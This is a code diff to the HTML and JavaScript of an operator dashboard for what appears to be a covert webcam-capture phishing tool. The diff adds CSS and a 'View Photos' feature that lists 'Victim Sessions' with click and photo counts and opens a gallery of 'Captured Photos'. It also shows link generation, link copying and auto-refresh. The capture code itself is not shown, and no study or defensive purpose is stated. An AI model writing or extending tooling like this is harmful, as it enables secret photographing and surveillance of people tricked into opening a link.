@@ -76,8 +76,32 @@
             transform: scale(1.05);
             box-shadow: 0 10px 30px rgba(192,132,252,0.3);
         }
+        .btn-secondary {
+            background: rgba(255,255,255,0.1);
+            border: none;
+            color: #fff;
+            padding: 12px 30px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        .btn-secondary:hover {
+            background: rgba(255,255,255,0.2);
+        }
+        .btn-group {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin-bottom: 20px;
+        }
         .sessions {
             margin-top: 30px;
+        }
+        .sessions h3 {
+            margin-bottom: 15px;
+            color: rgba(255,255,255,0.7);
         }
         .session-item {
             background: rgba(255,255,255,0.03);
@@ -88,6 +112,8 @@
             justify-content: space-between;
             align-items: center;
             border-left: 3px solid rgba(255,255,255,0.1);
+            flex-wrap: wrap;
+            gap: 10px;
         }
         .session-item.active {
             border-left-color: #c084fc;
@@ -124,6 +150,11 @@
             font-family: 'Courier New', monospace;
             font-size: 12px;
             border: 1px solid rgba(255,255,255,0.05);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 10px;
         }
         .copy-btn {
             background: rgba(255,255,255,0.1);
@@ -137,25 +168,33 @@
         .copy-btn:hover {
             background: rgba(255,255,255,0.2);
         }
-        .btn-secondary {
-            background: rgba(255,255,255,0.1);
-            border: none;
-            color: #fff;
-            padding: 12px 30px;
-            border-radius: 10px;
-            font-size: 16px;
-            font-weight: 600;
+        .view-photos-btn {
+            background: rgba(192,132,252,0.2);
+            border: 1px solid rgba(192,132,252,0.3);
+            color: #c084fc;
+            padding: 4px 12px;
+            border-radius: 8px;
             cursor: pointer;
-            transition: all 0.3s ease;
+            font-size: 11px;
         }
-        .btn-secondary:hover {
-            background: rgba(255,255,255,0.2);
+        .view-photos-btn:hover {
+            background: rgba(192,132,252,0.3);
         }
-        .btn-group {
+        .no-sessions {
+            color: rgba(255,255,255,0.3);
+            text-align: center;
+            padding: 40px 0;
+        }
+        .session-info {
             display: flex;
-            gap: 10px;
+            flex-direction: column;
+            gap: 4px;
+        }
+        .session-actions {
+            display: flex;
+            gap: 8px;
+            align-items: center;
             flex-wrap: wrap;
-            margin-bottom: 20px;
         }
     </style>
 </head>
@@ -197,17 +236,109 @@
     </div>
     
     <div class="sessions">
-        <h3 style="margin-bottom: 15px; color: rgba(255,255,255,0.7);">📊 Victim Sessions</h3>
+        <h3>📊 Victim Sessions</h3>
         <div id="sessionsList">
-            <p style="color: rgba(255,255,255,0.3); text-align: center; padding: 40px 0;">
-                No sessions yet. Generate a link to start.
-            </p>
+            <p class="no-sessions">No sessions yet. Generate a link to start.</p>
         </div>
     </div>
-    
+
     <script>
         let currentLink = '';
-        
+
+        // View photos for a session
+        async function viewPhotos(sessionId) {
+            try {
+                const res = await fetch(`/api/photos/${sessionId}`);
+                const data = await res.json();
+                
+                if (data.photos && data.photos.length > 0) {
+                    const win = window.open('', '_blank');
+                    win.document.write(`
+                        <html>
+                        <head>
+                            <title>📸 Captured Photos</title>
+                            <style>
+                                body { 
+                                    font-family: 'Segoe UI', sans-serif; 
+                                    background: #0a0a1a; 
+                                    color: #fff; 
+                                    padding: 20px; 
+                                    display: flex;
+                                    flex-wrap: wrap;
+                                    gap: 20px;
+                                    justify-content: center;
+                                }
+                                .photo-card {
+                                    background: rgba(255,255,255,0.05);
+                                    border-radius: 16px;
+                                    padding: 16px;
+                                    border: 1px solid rgba(255,255,255,0.1);
+                                    width: 320px;
+                                    text-align: center;
+                                }
+                                .photo-card img {
+                                    width: 100%;
+                                    border-radius: 12px;
+                                    border: 2px solid rgba(192,132,252,0.2);
+                                }
+                                .photo-card .meta {
+                                    font-size: 11px;
+                                    color: rgba(255,255,255,0.4);
+                                    margin-top: 8px;
+                                }
+                                h1 {
+                                    background: linear-gradient(90deg, #c084fc, #ec4899);
+                                    -webkit-background-clip: text;
+                                    -webkit-text-fill-color: transparent;
+                                    width: 100%;
+                                    text-align: center;
+                                }
+                                .back-btn {
+                                    background: rgba(255,255,255,0.1);
+                                    border: none;
+                                    color: #fff;
+                                    padding: 10px 24px;
+                                    border-radius: 10px;
+                                    cursor: pointer;
+                                    font-size: 14px;
+                                    width: 100%;
+                                    margin-bottom: 20px;
+                                }
+                                .back-btn:hover {
+                                    background: rgba(255,255,255,0.2);
+                                }
+                                .no-photos {
+                                    text-align: center;
+                                    color: rgba(255,255,255,0.3);
+                                    padding: 40px;
+                                    width: 100%;
+                                }
+                            </style>
+                        </head>
+                        <body>
+                            <button class="back-btn" onclick="window.close()">⬅ Close</button>
+                            <h1>📸 Captured Photos</h1>
+                            ${data.photos.map(p => `
+                                <div class="photo-card">
+                                    <img src="${p.image}" alt="Captured photo" />
+                                    <div class="meta">
+                                        ${new Date(p.timestamp).toLocaleString()}
+                                    </div>
+                                </div>
+                            `).join('')}
+                        </body>
+                        </html>
+                    `);
+                    win.document.close();
+                } else {
+                    alert('No photos found for this session.');
+                }
+            } catch (err) {
+                alert('Failed to load photos: ' + err.message);
+            }
+        }
+
+        // Fetch dashboard data
         async function fetchDashboard() {
             try {
                 const res = await fetch('/api/dashboard');
@@ -221,27 +352,37 @@
                 
                 const list = document.getElementById('sessionsList');
                 if (sessions.length === 0) {
-                    list.innerHTML = '<p style="color: rgba(255,255,255,0.3); text-align: center; padding: 40px 0;">No sessions yet. Generate a link to start.</p>';
+                    list.innerHTML = '<p class="no-sessions">No sessions yet. Generate a link to start.</p>';
                     return;
                 }
                 
                 list.innerHTML = sessions.map(s => `
                     <div class="session-item ${s.status === 'ACTIVE' ? 'active' : ''}">
-                        <div>
+                        <div class="session-info">
                             <div class="session-id">${s.id}</div>
                             <div class="session-details">Clicks: ${s.clicks} · Photos: ${s.photos} · Created: ${new Date(s.created).toLocaleString()}</div>
                         </div>
-                        <div>
+                        <div class="session-actions">
                             <span class="session-status ${s.status === 'ACTIVE' ? 'status-active' : 'status-waiting'}">${s.status}</span>
+                            ${s.photos > 0 ? `<button class="view-photos-btn" data-session="${s.id}">📸 View Photos</button>` : ''}
                         </div>
                     </div>
                 `).join('');
-                
+
+                // Add event listeners for view photo buttons
+                document.querySelectorAll('.view-photos-btn').forEach(btn => {
+                    btn.addEventListener('click', async function() {
+                        const sessionId = this.dataset.session;
+                        await viewPhotos(sessionId);
+                    });
+                });
+
             } catch (err) {
                 console.error('Failed to fetch dashboard:', err);
             }
         }
-        
+
+        // Generate new link
         document.getElementById('generateBtn').addEventListener('click', async () => {
             try {
                 const res = await fetch('/api/generate', { method: 'POST' });
@@ -256,23 +397,34 @@
                 alert('Failed to generate link: ' + err.message);
             }
         });
-        
+
+        // Copy link
         function copyLink() {
-            navigator.clipboard.writeText(currentLink).then(() => {
-                alert('✅ Link copied to clipboard!');
-            }).catch(() => {
-                const textarea = document.createElement('textarea');
-                textarea.value = currentLink;
-                document.body.appendChild(textarea);
-                textarea.select();
-                document.execCommand('copy');
-                document.body.removeChild(textarea);
-                alert('✅ Link copied!');
-            });
+            if (navigator.clipboard) {
+                navigator.clipboard.writeText(currentLink).then(() => {
+                    alert('✅ Link copied to clipboard!');
+                }).catch(() => {
+                    fallbackCopy();
+                });
+            } else {
+                fallbackCopy();
+            }
         }
-        
+
+        function fallbackCopy() {
+            const textarea = document.createElement('textarea');
+            textarea.value = currentLink;
+            document.body.appendChild(textarea);
+            textarea.select();
+            document.execCommand('copy');
+            document.body.removeChild(textarea);
+            alert('✅ Link copied!');
+        }
+
+        // Refresh
         document.getElementById('refreshBtn').addEventListener('click', fetchDashboard);
-        
+
+        // Auto-refresh every 10 seconds
         fetchDashboard();
         setInterval(fetchDashboard, 10000);
     </script>
